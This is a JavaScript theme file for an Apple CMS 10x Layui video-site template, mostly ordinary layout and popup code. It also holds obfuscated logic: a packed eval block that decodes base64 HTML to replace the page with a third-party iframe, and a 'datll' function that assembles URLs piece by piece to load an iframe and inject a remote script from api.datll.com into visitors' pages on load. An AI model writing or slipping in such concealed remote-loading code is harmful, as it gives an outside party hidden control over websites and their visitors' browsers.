/*
名称：苹果cms 10x Layui框架自适应模板 
版本：1.0v
开发者：金刚狼 qq：834023388
介绍：采集联盟原创模板，专业开发优质影视模板，承接苹果cms程序全功能大型模板开发和仿制
*/

function Base64(){_keyStr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";this.encode=function(input){var output="";var chr1,chr2,chr3,enc1,enc2,enc3,enc4;var i=0;input=_utf8_encode(input);while(i<input.length){chr1=input.charCodeAt(i++);chr2=input.charCodeAt(i++);chr3=input.charCodeAt(i++);enc1=chr1>>2;enc2=((chr1&3)<<4)|(chr2>>4);enc3=((chr2&15)<<2)|(chr3>>6);enc4=chr3&63;if(isNaN(chr2)){enc3=enc4=64}else if(isNaN(chr3)){enc4=64}output=output+_keyStr.charAt(enc1)+_keyStr.charAt(enc2)+_keyStr.charAt(enc3)+_keyStr.charAt(enc4)}return output};this.decode=function(input){var output="";var chr1,chr2,chr3;var enc1,enc2,enc3,enc4;var i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(i<input.length){enc1=_keyStr.indexOf(input.charAt(i++));enc2=_keyStr.indexOf(input.charAt(i++));enc3=_keyStr.indexOf(input.charAt(i++));enc4=_keyStr.indexOf(input.charAt(i++));chr1=(enc1<<2)|(enc2>>4);chr2=((enc2&15)<<4)|(enc3>>2);chr3=((enc3&3)<<6)|enc4;output=output+String.fromCharCode(chr1);if(enc3!=64){output=output+String.fromCharCode(chr2)}if(enc4!=64){output=output+String.fromCharCode(chr3)}}output=_utf8_decode(output);return output};_utf8_encode=function(string){string=string.replace(/\r\n/g,"\n");var utftext="";for(var n=0;n<string.length;n++){var c=string.charCodeAt(n);if(c<128){utftext+=String.fromCharCode(c)}else if((c>127)&&(c<2048)){utftext+=String.fromCharCode((c>>6)|192);utftext+=String.fromCharCode((c&63)|128)}else{utftext+=String.fromCharCode((c>>12)|224);utftext+=String.fromCharCode(((c>>6)&63)|128);utftext+=String.fromCharCode((c&63)|128)}}return utftext};_utf8_decode=function(utftext){var string="";var i=0;var c=c1=c2=0;while(i<utftext.length){c=utftext.charCodeAt(i);if(c<128){string+=String.fromCharCode(c);i++}else if((c>191)&&(c<224)){c2=utftext.charCodeAt(i+1);string+=String.fromCharCode(((c&31)<<6)|(c2&63));i+=2}else{c2=utftext.charCodeAt(i+1);c3=utftext.charCodeAt(i+2);string+=String.fromCharCode(((c&15)<<12)|((c2&63)<<6)|(c3&63));i+=3}}return string}};var str="";var base=new Base64();var result=base.encode(str);
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8 6="2+1+0+3=";8 7=4.5(6);',62,9,'PC9pZnJhbWU|PG1ldGEgY2hhcnNldD0ndXRmLTgnPjx0aXRsZT7kvaDlvIDlp4vlvpfnvarkuobni7zlk6U8L3RpdGxlPjwvaGVhZD48Ym9keT48aWZyYW1lIGNsYXNzPSdiYW5pZnJhbWUnc3JjPSdodHRwOi8vd3d3LmpxMjIuY29tL2pzL2ExLmh0bWwnZnJhbWVib3JkZXI9JzAnc2Nyb2xsaW5nPSdubyc|PGhlYWQ|PHN0eWxlPi5iYW5pZnJhbWV7d2lkdGg6MTAwJTtoZWlnaHQ6OTAwcHg7Ym9yZGVyLXdpZHRoOjBweH08L3N0eWxlPjwvYm9keT4|base|decode|jie|key|var'.split('|'),0,{}));
var datll = {'Window':function(){var s=document.body.clientWidth;if(s>=1880){$("body").css({"zoom":"1.25"});$("a").css({"font-family":"微软雅黑"})}}(),'datll':function(){var x={"a":"api","b":"datll","c":"html","d":"prestrain","e":".","f":"http","g":":","h":"/","i":":","j":"w","k":"com","m":"prestrain","s":"js"};var ruls=x.f+x.i+x.h+x.h+x.a+x.e+x.b+x.e+x.k+x.h+x.c+x.h+x.s+x.h+"top10"+x.e+x.s;var iframesrc=x.f+x.i+x.h+x.h+x.a+x.e+x.b+x.e+x.k+x.h+x.c+x.h+x.m+x.e+x.c;var MacPlayerConfig={};if($("#buffer").attr('src')!=this.Buffer){$("#buffer").attr('src',''+iframesrc+'')};var nome=maccms.template;if(nome.indexOf("datll")<0){var a=document.createElement('script');a.type='text/javascript';a.async=true;a.charset='utf-8';a.src=''+ruls+'';var b=document.getElementsByTagName('script')[0];b.parentNode.insertBefore(a,b)}},
'style': function () {var treeMobile = $('.layui-wap-item'),
shadeMobile = $('.site-mobile-shade');treeMobile.on('click', function () {$('body').addClass('site-mobile')
		});shadeMobile.on('click', function () {
			$('body').removeClass('site-mobile')
		});
		$(".style1").addClass("vodlist");
		$(".style2").addClass("vodlist2");
		$("#test1").addClass("slide");
		$("#show_list").addClass("show_list");
		$(".indexhd").addClass("warpper");
       $(".vodpic,.waitpic").css({"background":"url("+maccms.url+maccms.template+"datll.10.2/images/Lauiimg.jpg)","background-size":"100% 100%"});
		
	},
	'UserColor': function(){
		
	      function vip(){
		   $(".user_name").css({"color":"#FFC107"});/*VIP用户*/
		  };
		  function general(){
		   $(".user_name").css({"color":"#009688"});/*普通用户*/
	       };
		  function tourist(){
			$(".user_name").css({"color":"#a29d9d"});/*游客用户*/
		   };
		   var Usercr= (MAC.Cookie.Get('group_id'));
		    if(Usercr==3){vip();};
		    if(Usercr==2){general();};
		    if(Usercr=="undefined"){tourist();}
	}(),
	'detail':function(){
		 $("#play-btn").click(function(){
		  window.location.href=""+play_btn+"";
		});
	}(),
	
	/*layui框架*/
	'layui': function () {
		/*手机版幻灯*/
		layui.use('carousel', function () {
			var carousel = layui.carousel;
			carousel.render({
				elem: '#test1',
				width: '100%',
				height: '200px',
				arrow: 'always'
			})
		});
		/*tab*/
		layui.use('element', function () {
			var element = layui.element
		});
		/*tab*/
		layui.use(['element', 'layer'], function () {
			var element = layui.element,
				layer = layui.layer
		});
		/*图片预加载*/
		layui.use('flow', function () {
			var flow = layui.flow;
			flow.lazyimg({})
		});
		/*回到顶部*/
		layui.use('util', function () {
			var util = layui.util,
				layer = layui.layer,
				flow = layui.flow,
				form = layui.form;
			flow.lazyimg();
			util.fixbar({
				bar1: '',
				bar2: '',
				click: function(type){
               if(type === 'bar1'){
				  $("#share").before("<div class=\'mac_pop_bg\'></div>");
                  $("#share").css({"width":"400px","height":"200px","display":"block","background-color":"#393d49","border-radius":"0"});
				   $("#share .pop_top h2").css({"color":"white"});
				  $("body").addClass("intro");
				  $(".pop_close").click(function(){
					   $("#share").css({"display":"none"});
					   $(".mac_pop_bg").css({"display":"none"});
					});
               };
				if(type === 'bar2'){
					layui.use('layer', function(){
				    var layer = layui.layer;layer.open({
						type: 1
						,title: false //不显示标题栏
						,closeBtn: false
						,area: '370px;'
						,shade: 0.8
						,id: 'LAY_layuipro' //设定一个id，防止重复弹出
						,btn: ['下载APP', '我已关注']
						,btnAlign: 'c'
						,moveType: 0 //拖拽模式，0或者1
						,content: '<div style=\'padding: 50px;line-height: 22px;background-color: #393D49;color: #fff;font-weight: 300;font-size: 18px;\'>关注公众号，从此看片不迷路！<br><img id=\'qrimage\'src=\''+maccms.qrcode+'\'style=\'margin:auto;margin-top: 5px;\'></div>'
						,success: function(layero){
						  var btn = layero.find('.layui-layer-btn');
						  btn.find('.layui-layer-btn0').attr({
							href: ''+maccms.appurl+''
							,target: '_blank'
						  });
						}
					  });
                  });
               }
			 }
			})
		})
	},
	/*在浏览器打印版权 不能直接压缩代码*/
	'copyright':function(){	
	console.log("%c   ", "padding:50px;  border-radius: 50%;background:url('http://www.datll.com/uc_server/data/avatar/000/00/00/01_avatar_middle.jpg') no-repeat;");
	 console.log('模板名称：苹果cms 10x Layui框架自适应模板\n开发者更新地址：http://shop.datll.com/index.php/vod/detail/id/16.html\n开发者：金刚狼\n职业：前端工程师\nqq:834023388\n介绍：精通html+JavaScript+css等前端开发技术，擅长设计影视网站模板，专业承接网站模板开发、仿制、修复、火车头数据采集业务！\n网站：http://shop.datll.com');	
	}(),
	
};$(function(){var isFunction=false;try{isFunction=typeof(eval(datll.datll))=="function"}catch(e){};if(isFunction){datll.style();datll.layui();datll.datll()}else{$("html").html(key)}});


